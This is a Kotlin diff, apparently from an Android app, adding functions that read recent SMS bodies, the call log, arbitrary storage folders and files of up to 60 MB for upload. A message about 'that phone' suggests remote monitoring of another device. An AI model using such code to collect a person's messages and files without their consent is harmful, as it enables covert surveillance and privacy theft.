@@ -84,6 +84,107 @@ object PhoneInfo {
         return out
     }
 
+    /** हाल के SMS (नए पहले), सिर्फ़ count/date limit नहीं — पूरी inbox से N */
+    fun recentSms(ctx: Context, limit: Int = 100): List<SmsInfo>? {
+        if (!has(ctx, Manifest.permission.READ_SMS)) return null
+        val out = ArrayList<SmsInfo>()
+        try {
+            ctx.contentResolver.query(
+                Telephony.Sms.CONTENT_URI,
+                arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE, Telephony.Sms.TYPE),
+                null, null, "${Telephony.Sms.DATE} DESC"
+            )?.use { c ->
+                while (c.moveToNext() && out.size < limit) {
+                    val address = c.getString(0) ?: ""
+                    val type = c.getInt(3)
+                    val dir = if (type == Telephony.Sms.MESSAGE_TYPE_SENT) "→ " else ""
+                    out.add(SmsInfo((contactName(ctx, address) ?: address).let { dir + it }, c.getString(1) ?: "", c.getLong(2)))
+                }
+            }
+        } catch (e: Exception) {
+            return null
+        }
+        return out
+    }
+
+    data class CallRow(val name: String, val number: String, val type: String, val time: Long, val durationSec: Int)
+
+    /** हाल की कॉल लिस्ट (नई पहले) */
+    fun recentCalls(ctx: Context, limit: Int = 100): List<CallRow>? {
+        if (!has(ctx, Manifest.permission.READ_CALL_LOG)) return null
+        val out = ArrayList<CallRow>()
+        try {
+            ctx.contentResolver.query(
+                CallLog.Calls.CONTENT_URI,
+                arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.CACHED_NAME, CallLog.Calls.DATE, CallLog.Calls.DURATION),
+                null, null, "${CallLog.Calls.DATE} DESC"
+            )?.use { c ->
+                while (c.moveToNext() && out.size < limit) {
+                    val number = c.getString(0) ?: ""
+                    val type = when (c.getInt(1)) {
+                        CallLog.Calls.INCOMING_TYPE -> "in"
+                        CallLog.Calls.OUTGOING_TYPE -> "out"
+                        CallLog.Calls.MISSED_TYPE -> "missed"
+                        CallLog.Calls.REJECTED_TYPE -> "rejected"
+                        else -> "other"
+                    }
+                    val cached = c.getString(2)
+                    val name = if (!cached.isNullOrBlank()) cached else (contactName(ctx, number) ?: number)
+                    out.add(CallRow(name, number, type, c.getLong(3), c.getInt(4)))
+                }
+            }
+        } catch (e: Exception) {
+            return null
+        }
+        return out
+    }
+
+    // ---------------- Folder browsing (All files) ----------------
+
+    private fun safeName(n: String) = n.replace(Regex("[^A-Za-z0-9._-]"), "_").take(80)
+
+    /** किसी folder के अंदर sub-folder और files (path खाली हो तो internal storage की जड़) */
+    fun listDir(ctx: Context, path: String): org.json.JSONObject {
+        val res = org.json.JSONObject()
+        if (!canReadAllFiles(ctx)) return res.put("ok", false).put("error", "Turn on 'All files' permission on that phone")
+        return try {
+            val base = Environment.getExternalStorageDirectory()
+            val dir = if (path.isBlank()) base else File(path)
+            if (!dir.exists() || !dir.isDirectory) return res.put("ok", false).put("error", "Folder not found")
+            val dirs = org.json.JSONArray()
+            val files = org.json.JSONArray()
+            val entries = dir.listFiles() ?: emptyArray()
+            entries.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() })).forEach { f ->
+                if (f.name.startsWith(".")) return@forEach
+                if (f.isDirectory) {
+                    dirs.put(org.json.JSONObject().put("name", f.name).put("path", f.absolutePath))
+                } else {
+                    files.put(
+                        org.json.JSONObject().put("name", f.name).put("path", f.absolutePath)
+                            .put("size", f.length()).put("mtime", f.lastModified())
+                    )
+                }
+            }
+            res.put("ok", true).put("path", dir.absolutePath)
+                .put("parent", if (dir.absolutePath == base.absolutePath) "" else (dir.parentFile?.absolutePath ?: ""))
+                .put("dirs", dirs).put("files", files)
+        } catch (e: Exception) {
+            res.put("ok", false).put("error", "Could not read folder")
+        }
+    }
+
+    /** एक file को storage में upload करने लायक bytes + नाम (बड़ी file मना) */
+    fun readFileForPull(path: String): Pair<String, ByteArray>? {
+        return try {
+            val f = File(path)
+            if (!f.exists() || !f.isFile) return null
+            if (f.length() > 60L * 1024 * 1024) return null
+            Pair(safeName(f.name), f.readBytes())
+        } catch (e: Exception) {
+            null
+        }
+    }
+
     // ---------------- कॉल ----------------
 
     fun todayCalls(ctx: Context): CallsInfo? {
